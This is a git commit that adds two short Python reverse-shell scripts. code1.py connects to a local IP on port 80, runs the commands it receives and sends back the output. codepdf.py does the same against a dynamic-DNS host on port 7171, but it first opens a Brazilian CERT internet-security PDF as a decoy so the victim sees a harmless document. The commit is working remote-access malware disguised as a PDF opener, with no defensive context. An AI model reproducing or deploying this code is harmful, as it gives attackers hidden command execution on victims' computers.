4e1f5e9537e51483ba59fd8e12ef6f1dc31f3536
BlackCyber21 <35323386+BlackCyber21@users.noreply.github.com>
2021-09-22 11:05:41 -0300

    Add files via upload

---
+++ code1.py
@@ -0,0 +1,24 @@
+import socket,os
+
+
+
+
+ip = "192.168.0.6"
+
+porta = 80
+
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((ip,porta))
+
+
+
+while True:
+
+    cmd = s.recv(1024)
+
+    for comando in os.popen(cmd):
+
+	s.send(comando)
---
+++ codepdf.py
@@ -0,0 +1,25 @@
+import socket,os
+
+
+
+os.popen('explorer https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf')
+
+
+
+ip = "sechost.ddns.net"
+
+porta = 7171
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((ip,porta))
+
+
+
+while True:
+
+    cmd = s.recv(1024)
+
+    for comando in os.popen(cmd):
+
+	s.send(comando)
